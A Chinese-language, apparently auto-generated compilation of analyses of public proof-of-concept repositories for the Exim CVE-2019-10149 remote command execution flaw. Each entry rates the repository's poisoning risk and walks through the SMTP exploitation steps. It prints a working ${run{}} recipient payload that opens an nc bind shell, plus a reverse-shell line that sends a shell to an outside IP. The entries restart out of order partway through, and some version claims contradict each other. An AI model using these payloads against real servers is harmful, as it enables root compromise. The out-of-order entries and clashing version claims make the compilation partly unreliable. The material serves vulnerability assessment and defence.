**来源**: [CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md](../2019/CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制受影响的服务器

**影响版本:** 4.87 - 4.91

**利用条件:** 需要 Exim 服务在目标机器上运行，且版本在受影响范围内，可能需要目标服务器开放25端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 邮件服务器中存在的远程命令执行漏洞。该漏洞是由于 `deliver_message()` 函数中对收件人地址的不正确验证引起的。攻击者可以通过发送特制的电子邮件利用此漏洞，从而在服务器上以 root 权限执行任意命令。

**有效性评估：**

提供的 PoC 代码 `PoC_CVE-2019-10149.py` 看起来有效。它通过 SMTP 协议与 Exim 服务器建立连接，并发送包含恶意命令的电子邮件。该命令嵌入在收件人地址中，利用了 Exim 的字符串扩展功能来执行命令。

多个来源（Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire）确认了该漏洞的存在和严重性，并指出该漏洞已被积极利用。

**投毒风险评估：**

该 PoC 代码本身相对简单，主要功能是利用漏洞执行命令。投毒的潜在风险较低，但并非完全没有。

*   **编码风险：** 代码中包含hex编码，降低了代码可读性，可能存在隐藏代码，如果hex编码混淆了正常的指令与后门代码，存在一定的风险。
*   **依赖风险：** 该脚本依赖Python3和socket，确保环境安全。
*   **维护者风险：**虽然README.md声明免责声明，但依旧存在风险，需要保持警惕。

综合考虑，该仓库的投毒风险评估在10%。

**利用方式分析：**

1.  **目标确认：** 确认目标系统运行着受影响版本的 Exim（4.87 到 4.91）。
2.  **SMTP 连接：** 使用 PoC 脚本通过 SMTP 协议连接到目标 Exim 服务器的 25 端口（或其他配置的端口）。
3.  **构造恶意邮件：** PoC 脚本构造一封包含恶意收件人地址的电子邮件。该地址利用 Exim 的字符串扩展功能来执行命令。
4.  **发送邮件：** 将构造的邮件发送到目标 Exim 服务器。
5.  **命令执行：** 如果漏洞利用成功，Exim 将以 root 权限执行嵌入在收件人地址中的命令。

**缓解措施：**

*   升级 Exim 到受影响版本之外的版本(>=4.92)。
*   禁用 Exim 的字符串扩展功能（如果可能）。
*   使用防火墙限制对 Exim 端口的访问。

**项目地址:** [MNEMO-CERT/PoC--CVE-2019-10149_Exim](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #7

**来源**: [CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md](../2019/CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** 4.87-4.91

**利用条件:** 目标系统运行受影响版本的Exim，且允许从攻击者主机到目标机器25端口的TCP连接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim 4.87到4.91版本中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以利用此漏洞，通过构造包含恶意命令的特殊邮件，在目标系统上执行任意代码，从而完全控制系统。

**有效性分析：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，可以确认此漏洞是真实存在的，并且PoC代码可以有效利用此漏洞。

**投毒风险分析：**
PoC代码通过`nc`在目标机器上反弹shell，监听31415端口。代码本身目的是利用漏洞，没有发现隐藏的恶意代码或后门，因此投毒风险较低，为0%。

**漏洞利用方式：**
1.  PoC首先通过`nc`连接到目标Exim服务器的25端口（SMTP）。
2.  发送`HELO`命令，声明客户端主机名。
3.  发送`MAIL FROM`命令，指定发件人地址。
4.  发送`RCPT TO`命令，指定收件人地址，其中收件人地址包含恶意的payload：`${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31415\t-e\t\x2fbin\x2fsh\x22}}@localhost`。
    *   这个payload使用了Exim的`${run{}}`扩展函数，可以在Exim进程中执行任意命令。
    *   payload的功能是执行`nc -lp 31415 -e /bin/sh`，即在目标机器上监听31415端口，并将/bin/sh绑定到该端口，相当于反弹了一个shell。
5.  发送`DATA`命令，开始邮件内容传输。
6.  发送一系列`Received:`头，用于填充邮件内容并触发漏洞（原因在于Exim对过长的头部处理可能存在问题，也可能是为了绕过某些过滤）。
7.  发送`.
`表示邮件内容结束。
8.  发送`QUIT`命令断开连接。
9.  PoC最后使用`nc localhost 31415`连接到目标机器上反弹的shell，实现远程代码执行。

**项目地址:** [Stick-U235/CVE-2019-10149-Exploit](https://github.com/Stick-U235/CVE-2019-10149-Exploit)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #8

**来源**: [CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md](../2019/CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务对外开放SMTP端口(默认25)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以通过构造包含恶意代码的特殊收件人地址，利用`run{}`扩展函数执行任意命令。该漏洞的利用方式主要通过SMTP协议发送特制的邮件，在`RCPT TO`指令中注入恶意payload。PoC代码构造了包含payload的收件人地址，利用`${run{}}`语法执行命令。考虑到PoC作者公开了他的代码，并且投毒代码的收益比直接攻击低，因此投毒概率较低，但是仍存在一定风险。

**项目地址:** [VoyagerOnne/Exim-CVE-2019-10149](https://github.com/VoyagerOnne/Exim-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #9

**来源**: [CVE-2019-10149-aishee_CVE-2019-10149-quick.md](../2019/CVE-2019-10149-aishee_CVE-2019-10149-quick.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标系统运行存在漏洞版本的 Exim，且攻击者能够发送邮件到目标服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当导致远程命令执行。攻击者可以通过构造特殊的邮件，在收件人地址中注入恶意命令，当 Exim 处理该邮件时，这些命令会被执行，从而控制服务器。

**有效性:**
根据搜索引擎结果，该漏洞已被广泛证实存在，并且有公开的 PoC 利用代码。漏洞库信息也确认了该漏洞的存在。

**投毒风险:**
提供的 PoC 代码包含一个 Bash 脚本，用于检测目标操作系统并尝试更新 Exim 和 Curl 软件包。这个脚本本身看起来像是尝试修复漏洞，而非利用它。`README.md` 文件也描述脚本为快速修复程序。虽然脚本尝试更新软件包，但如果服务器配置不当，或者更新源被恶意篡改，也存在一定的风险。此外，`apt-get --yes --force-yes install`和 `yum install -y -q -e 0` 在没有充分验证更新源的情况下，可能安装恶意的软件包。因此，存在极小的潜在投毒风险，约为 1%。

**利用方式:**
1.  攻击者需要确定目标服务器运行的是 Exim 4.87 到 4.91 之间的易受攻击版本。
2.  攻击者构造一封包含恶意命令的电子邮件。该命令被嵌入到收件人地址中，利用了 `deliver_message()` 函数的漏洞。
3.  攻击者将构造的邮件发送到目标服务器。
4.  当 Exim 处理该邮件时，会执行嵌入在收件人地址中的恶意命令，从而导致远程代码执行。攻击者可以使用此漏洞来安装后门、窃取敏感信息或执行其他恶意操作。

**项目地址:** [aishee/CVE-2019-10149-quick](https://github.com/aishee/CVE-2019-10149-quick)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #10

**来源**: [CVE-2019-10149-bananaphones_exim-rce-quickfix.md](../2019/CVE-2019-10149-bananaphones_exim-rce-quickfix.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响版本的Exim，且漏洞未被修复

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，是由于 `deliver_message()` 函数中对接收者地址验证不当造成的远程命令执行漏洞。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞的POC代码是有效的。搜索引擎结果显示该漏洞已被广泛利用，并且有活跃的Linux蠕虫利用此漏洞传播。漏洞利用代码中的 `exim_rce_fixer.sh` 脚本尝试更新 Exim 并移除恶意软件，表明存在利用该漏洞植入的恶意程序。

**投毒风险分析：**
提供的脚本 `exim_rce_fixer.sh` 旨在修复漏洞并清理恶意软件，但它本身可能存在投毒风险。脚本尝试删除与 `tor2web` 相关的恶意软件，更新 Exim，并删除可疑的 cron 任务和 authorized_keys 条目。但是，如果脚本未能完全清除恶意软件，或者脚本本身包含恶意代码，则可能导致系统受损。此外，脚本强制重启服务器，这可能导致数据丢失或服务中断。

`malware_do_not_run.sh` 脚本明确包含连接到 Tor 网络的行为，并尝试下载和执行恶意代码。尽管文件名暗示不要运行，但攻击者可以通过该脚本植入恶意软件。

综合考虑，脚本中清理恶意软件的部分看起来是合法的，但 `malware_do_not_run.sh` 脚本和`exim_rce_fixer.sh`脚本潜在的清理不完全和强制重启行为构成了投毒风险。

**利用方式：**
1.  攻击者构造包含恶意命令的特殊邮件。
2.  Exim 在处理邮件时，由于对接收者地址验证不当，将恶意命令传递给系统 shell 执行。
3.  攻击者从而在目标服务器上获得远程代码执行权限。
4.  攻击者可能利用该权限安装恶意软件，窃取数据，或控制服务器。

**项目地址:** [bananaphones/exim-rce-quickfix](https://github.com/bananaphones/exim-rce-quickfix)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #11

**来源**: [CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md](../2019/CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，并且攻击者可以向Exim服务器发送邮件。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理（MTA）的 deliver_message() 函数中，由于对收件人地址的验证不当导致。未经身份验证的远程攻击者可以通过向目标服务器发送特制的邮件来利用此漏洞，从而在目标系统上执行任意命令。漏洞利用通常涉及在邮件收件人地址中注入 shell 命令。 

根据提供的漏洞利用代码，`/tmp/b373ced1c77bc05f74b9541e06f0010c/README.md`文件主要包含关于CVE-2019-10149、CVE-2019-15846 和 CVE-2019-16928漏洞的相关信息收集，包括漏洞公告、漏洞利用详情、问题时间线、NSA公告以及受影响的IP、ASN、国家和主机名等数据链接。其中`election-domains-by-expiration-date.txt`文件是域名列表, 不太可能直接用于漏洞利用，但是可能被用于信息收集或后续攻击。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开的漏洞利用代码，因此可以判断提供的漏洞利用代码是有效的。

**投毒风险：** 该仓库中存在的投毒代码可能性较低，主要是因为其内容以漏洞信息搜集为主，提供的数据源链接也是公开信息。`election-domains-by-expiration-date.txt`可能存在搜集来的恶意域名，但作者进行恶意添加的可能性较低。

**利用方式：** 攻击者构造包含恶意命令的邮件，利用Exim在处理收件人地址时的验证缺陷，将命令注入到系统执行。这通常通过在收件人地址中嵌入反引号或者其他命令执行符号来实现。该漏洞允许攻击者远程执行代码而无需身份验证。

**项目地址:** [cloudflare/exim-cve-2019-10149-data](https://github.com/cloudflare/exim-cve-2019-10149-data)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #12

**来源**: [CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md](../2019/CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程命令执行和系统被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** Exim服务对外开放，攻击者能够发送恶意构造的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，由于 `deliver_message()` 函数对接收者地址验证不当，攻击者可以通过发送特制的邮件，在目标服务器上执行任意命令。从提供的漏洞利用代码来看，利用方式主要有两种：

1.  **本地检测脚本 (eximioc.sh):**  此脚本用于在目标服务器本地运行，检测是否存在漏洞利用的迹象，例如检查Exim版本、cPanel版本以及是否存在异常进程 `kthrotlds`。

2.  **远程利用脚本 (eximrce.py):**  此脚本用于远程触发漏洞。它通过socket连接到目标服务器的Exim服务端口，发送包含恶意payload的邮件。Payload利用 `${run{...}}` 结构在服务器上执行命令，例如创建一个文件 `/root/lweximtest`。如果文件创建成功，则表明服务器存在远程命令执行漏洞。

**漏洞利用方式总结:**

*   攻击者构造包含恶意recipient地址的邮件。
*   邮件被发送到运行存在漏洞的Exim服务器。
*   Exim服务器在处理邮件时，由于recipient地址验证不当，执行了恶意payload中的命令。
*   攻击者在服务器上执行任意命令。

**投毒风险分析:**

提供的 `eximrce.py` 代码本身功能明确，旨在测试是否存在 CVE-2019-10149 漏洞。`eximioc.sh` 的目标也是检测漏洞和受攻击迹象。 但是依然存在以下风险，风险值给到10%。

*   **作者风险：** 从GitHub仓库直接下载并运行代码，存在一定的作者恶意投毒风险。例如，作者可能在脚本中添加隐藏的后门代码，在漏洞利用的同时，植入恶意程序。
*   **依赖风险：** `eximioc.sh` 脚本依赖 `expect` 和 `openssl` 命令。如果系统上安装的 `expect` 或 `openssl` 被篡改，则可能引入新的安全风险。
*   **维护风险：** 仓库如果长时间没有更新和维护，可能会被其他人恶意篡改，引入恶意代码。
*   **测试文件的影响:**虽然 `eximrce.py` 仅仅touch了一个文件,但是如果被滥用，将可能导致拒绝服务攻击。

**项目地址:** [cowbe0x004/eximrce-CVE-2019-10149](https://github.com/cowbe0x004/eximrce-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #13

**来源**: [CVE-2019-10149-darsigovrustam_CVE-2019-10149.md](../2019/CVE-2019-10149-darsigovrustam_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #14

**来源**: [CVE-2019-10149-hyim0810_CVE-2019-10149.md](../2019/CVE-2019-10149-hyim0810_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行和系统完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行受影响版本的Exim，且攻击者能够通过网络连接到SMTP端口（通常是25端口）。配置不当，如允许任意relay，会降低利用难度。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是Exim邮件传输代理（MTA）中的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对接收者地址的不正确验证。攻击者可以通过构造包含恶意命令的特殊邮件，利用该漏洞在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个已知的、被广泛讨论和利用的漏洞。漏洞利用代码提供了详细的利用步骤，包括：

1.  安装受影响版本的Exim（4.87-4.91）。
2.  修改Exim配置以允许relay（简化利用，否则需要等待7天）。
3.  使用netcat (nc) 连接到目标Exim服务器的25端口。
4.  通过SMTP协议发送特制的邮件，其中接收者地址包含要执行的命令（hex编码）。
5.  发送DATA命令和后续数据，触发漏洞。

**投毒风险分析：**

提供的漏洞利用代码中存在一定的投毒风险，但风险较低（约10%）。

主要风险点在于`RemoteConnection.sh`脚本。该脚本的功能是建立一个反向shell，将目标服务器上的`/tmp/1`文件的内容通过`nc`命令发送到攻击者的IP地址和端口。潜在的投毒方式可能包括：

*   **替换`/tmp/1`的内容：** 攻击者可以将恶意代码写入`/tmp/1`文件，并通过反向shell在攻击者机器上执行。
*   **`RemoteConnection.sh`本身的恶意代码：** 脚本可能包含一些隐藏的后门或恶意操作，例如收集系统信息、安装rootkit等。但这个可能性较低，因为脚本相对简单且功能明确。
*   **依赖攻击者服务器的风险：** 脚本依赖于从攻击者的服务器下载`RemoteConnection.sh`，如果攻击者控制的服务器被攻陷，或者攻击者修改了`RemoteConnection.sh`脚本的内容，可能会导致受害者执行恶意代码。

漏洞利用仓库中安装的Exim版本以及对`/usr/exim/configure`文件的修改，是为了简化利用流程，使其更容易被利用。这些修改本身不是投毒代码，但降低了利用门槛，可能导致漏洞被更广泛地利用。

**利用方式总结：**

1.  **目标环境准备：** 确保目标服务器运行着受影响版本的Exim（4.87-4.91）。
2.  **网络连接：** 攻击者需要能够通过网络连接到目标服务器的25端口。
3.  **Payload构造：** 攻击者需要将要执行的命令转换为十六进制编码，并将其嵌入到SMTP `RCPT TO` 命令的接收者地址中，格式为 `<${run{hex_encoded_command}}@localhost>`。
4.  **SMTP交互：** 攻击者使用SMTP协议与目标服务器进行交互，发送`HELO`、`MAIL FROM`、`RCPT TO` 和 `DATA` 等命令，触发漏洞。
5.  **代码执行：** 漏洞触发后，Exim会执行嵌入在接收者地址中的命令，攻击者从而获得对目标服务器的控制权。

**项目地址:** [hyim0810/CVE-2019-10149](https://github.com/hyim0810/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #15

**来源**: [CVE-2019-10149-qlusec_CVE-2019-10149.md](../2019/CVE-2019-10149-qlusec_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可远程执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive), 4.92受影响

**利用条件:** 目标系统运行存在漏洞的Exim版本，且允许接收邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当，导致攻击者可以通过构造特殊的邮件，在目标服务器上执行任意命令。

**有效性：**

提供的POC代码是有效的，它展示了如何利用此漏洞执行命令。POC中的 `payload.txt` 文件构造了一个包含嵌入命令的收件人地址。`rcpt to:` 字段包含一个`${run{...}}` 块，Exim 会执行该块中的命令。

**投毒风险：**

此仓库存在一定的投毒风险。虽然 `payload.txt` 文件展示了漏洞利用方法，但 `README.md` 文件内容过于简单，缺乏漏洞的详细说明和利用注意事项。此外，POC代码中包含反弹shell的操作，可能被用于恶意目的，如果攻击者替换了原有的反弹shell代码，风险较高。
综合评估投毒风险为10%。

**利用方式：**

1.  攻击者发送一封精心构造的邮件到目标 Exim 服务器。
2.  邮件的 `RCPT TO` 字段包含一个特殊的字符串，其中嵌入了要执行的命令。`${run{...}}`是一个常见的Exim宏扩展结构。
3.  当 Exim 处理该邮件时，由于漏洞的存在，它会执行嵌入在 `RCPT TO` 字段中的命令，该命令将执行反弹shell或其它恶意操作。
4.  命令执行结果被通过 `nc` 命令发送到攻击者的服务器。

**项目地址:** [qlusec/CVE-2019-10149](https://github.com/qlusec/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #16

**来源**: [CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md](../2019/CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md)

# CVE-2019-10149

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md](../2019/CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在4.87到4.91之间，需要网络访问25端口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理 (MTA) 的 deliver_message() 函数中，由于对接收者地址验证不当导致。攻击者可以通过发送特制的电子邮件，在目标服务器上执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的利用是有效的。POC代码 `wizard.py` 模拟了SMTP交互，利用`RCPT TO`命令中的`${run{...}}` 扩展功能，执行shell命令。

**投毒风险分析：**

检查提供的`wizard.py`文件，其中的payload经过了编码，目的是为了绕过一些检测机制。解码后的命令主要完成以下操作：

*   创建一个具有SUID权限的程序 `s`。
*   该程序 `s` 拥有root权限，执行后会启动一个root shell。
*   利用`${run{}}` 在服务器上执行编译命令，生成二进制文件s，并赋予SUID权限
*   POC的最后，执行该程序 `/tmp/s` 以获取root权限。

该POC旨在提升权限，而不是注入恶意代码到服务器的持久性位置，因此不属于传统的“投毒”行为。 投毒风险：0%

**利用方式：**

1.  攻击者连接到Exim服务器的25端口。
2.  发送HELO, MAIL FROM等SMTP命令进行初始化。
3.  利用 `RCPT TO` 命令，构造包含恶意命令的接收者地址，其中使用了 `${run{...}}` 扩展功能。
4.  发送DATA命令，提供邮件内容 (实际上邮件内容对利用该漏洞来说并不重要)。
5.  利用服务器执行`${run{}}`中的命令，该命令编译一个具有SUID的程序，攻击者执行该程序以获取root权限。

**项目地址:** [AzizMea/CVE-2019-10149-privilege-escalation](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #2

**来源**: [CVE-2019-10149-Brets0150_StickyExim.md](../2019/CVE-2019-10149-Brets0150_StickyExim.md)

## CVE-2019-10149 Exim RCE HoneyPot

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务运行且存在漏洞版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 4.87 到 4.91 版本中存在的一个远程代码执行漏洞。该漏洞源于 `deliver_message()` 函数中对接收者地址的不当验证，攻击者可以通过构造包含恶意命令的电子邮件，利用此漏洞在目标系统上执行任意代码。

**有效性评估：**

根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、被广泛讨论的严重漏洞，并且已经被实际利用。提供的漏洞利用代码实际上是一个蜜罐脚本，用于检测针对此漏洞的攻击尝试，而不是一个直接利用漏洞的 PoC。然而，README中提到了另一个PoC：`https://github.com/cowbe0x004/eximrce-CVE-2019-10149`， 可以验证漏洞。

**投毒风险评估：**

该仓库主要功能是做一个蜜罐，用于监控Exim漏洞(CVE-2019-10149)的攻击行为。

*   `install_StickyExim.sh`: 安装和配置蜜罐，包括Exim配置和Cron Job设置
*   `honey_harvester_exim_cve-2019-10149.sh`: 核心脚本，用于解析Exim日志，检测CVE-2019-10149攻击尝试，并发送告警邮件。

审查了安装脚本和核心检测脚本。发现主要功能是监控和告警，没有发现明显的恶意代码，考虑到代码会修改Exim配置以及加入Cron Job。存在一定的风险，但是风险较低。所以判断存在10%的投毒风险。

**利用方式分析：**

此PoC本身不是用于攻击的，而是用于创建一个蜜罐来捕获攻击流量。 但是根据漏洞描述，利用方式大致如下：

1.  攻击者构造一封特殊的电子邮件，该邮件的接收者地址包含恶意命令。
2.  当 Exim 处理这封邮件时，`deliver_message()` 函数未能正确验证接收者地址，导致恶意命令被执行。
3.  攻击者可以通过这种方式在服务器上执行任意代码，从而控制服务器。

**总结：**

该漏洞是一个严重的安全漏洞，可以允许未经身份验证的远程攻击者在受影响的 Exim 服务器上执行任意代码。需要尽快修补此漏洞。

**项目地址:** [Brets0150/StickyExim](https://github.com/Brets0150/StickyExim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #3

**来源**: [CVE-2019-10149-Chris-dev1_exim.exp.md](../2019/CVE-2019-10149-Chris-dev1_exim.exp.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响的Exim版本，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中。这是一个远程命令执行漏洞，由于 `deliver_message()` 函数中对接收者地址的验证不当，导致攻击者可以通过发送特制的电子邮件来执行任意命令。漏洞利用方式通常涉及构造包含恶意命令的电子邮件地址，这些命令会在 Exim 处理邮件时被执行。从搜索结果和漏洞库信息来看，此漏洞已被广泛利用。提供的代码片段仅为Apache License 2.0协议，不包含任何漏洞利用或恶意代码。因此，可以判断投毒风险为0%。根据搜索结果，漏洞利用代码已经公开。

**项目地址:** [Chris-dev1/exim.exp](https://github.com/Chris-dev1/exim.exp)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #4

**来源**: [CVE-2019-10149-Diefunction_CVE-2019-10149.md](../2019/CVE-2019-10149-Diefunction_CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标服务器运行存在漏洞的Exim版本，且允许外部连接到SMTP端口（默认25端口）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

